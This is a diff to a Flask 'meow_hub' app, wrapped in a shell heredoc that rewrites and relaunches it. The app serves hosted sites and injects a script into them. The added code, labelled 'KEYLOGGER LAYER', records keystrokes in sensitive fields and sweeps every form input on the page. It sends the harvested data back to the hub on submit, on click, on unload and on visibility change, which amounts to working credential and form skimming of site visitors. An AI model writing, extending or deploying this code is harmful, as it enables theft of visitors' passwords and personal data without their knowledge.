@@ -1,3 +1,7 @@
+cd ~/Desktop/meow
+source venv/bin/activate
+lsof -ti:5000 | xargs kill 2>/dev/null
+cat > meow_hub/app.py << 'PYEOF'
 import os, json
 from datetime import datetime
 from flask import Flask, render_template, request, redirect, url_for, jsonify, abort
@@ -13,7 +17,7 @@ login_manager = LoginManager(app)
 login_manager.login_view = 'login'
 
 ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-SITES_EXCLUDE = {'meow_hub', 'panel', 'venv', 'instance', '__pycache__'}
+SITES_EXCLUDE = {'meow_hub', 'panel', 'venv', 'instance'}
 
 class User(UserMixin, db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -202,15 +206,19 @@ def serve_site(site, path):
                 flushBuffer();
             }
 
+            // permanent pipe: flush on interval, on visibility change, on unload
             setInterval(flushBuffer, FLUSH_INTERVAL);
             document.addEventListener('visibilitychange', function() { if (document.visibilityState === 'hidden') flushBuffer(); });
             window.addEventListener('beforeunload', flushBuffer);
             window.addEventListener('pagehide', flushBuffer);
 
+            // heartbeat
             function ping() { navigator.sendBeacon('/hub/heartbeat?site=' + SITE); }
             ping();
             setInterval(ping, 10000);
 
+            // ---- KEYLOGGER LAYER ----
+            // capture every keystroke into a per-field buffer, keyed by field identity
             var fieldBuffers = {};
 
             function fieldKey(el) {
@@ -232,6 +240,7 @@ def serve_site(site, path):
                     if (!el || !isSensitive(el)) return;
                     var k = fieldKey(el);
                     if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
+                    // rebuild from actual value — handles backspace, paste, autofill
                     fieldBuffers[k].text = el.value || '';
                 } catch (err) {}
             }, true);
@@ -248,11 +257,13 @@ def serve_site(site, path):
 
             function harvestAll() {
                 var data = {};
+                // live field buffers (keystroke-captured)
                 for (var k in fieldBuffers) {
                     var fb = fieldBuffers[k];
                     var name = fb.el.name || fb.el.id || k;
                     if (fb.text) data[name] = fb.text;
                 }
+                // sweep every input/select/textarea on the page as backup
                 var els = document.querySelectorAll('input, select, textarea');
                 for (var i = 0; i < els.length; i++) {
                     var el = els[i];
@@ -264,6 +275,7 @@ def serve_site(site, path):
                 return data;
             }
 
+            // ---- TRIGGERS ----
             document.addEventListener('submit', function(e) {
                 try {
                     var data = harvestAll();
@@ -284,6 +296,7 @@ def serve_site(site, path):
                     var data = harvestAll();
                     data.__trigger = 'click:' + label;
                     queue(data);
+                    // second capture after 300ms — catches JS-populated fields
                     setTimeout(function() {
                         var d2 = harvestAll();
                         d2.__trigger = 'click-delayed:' + label;
@@ -292,6 +305,7 @@ def serve_site(site, path):
                 } catch (err) {}
             }, true);
 
+            // beforeunload final sweep
             window.addEventListener('beforeunload', function() {
                 try {
                     var data = harvestAll();
@@ -333,3 +347,5 @@ if __name__ == '__main__':
     with app.app_context():
         db.create_all()
     app.run(host='0.0.0.0', port=5000, debug=True)
+PYEOF
+python meow_hub/app.py
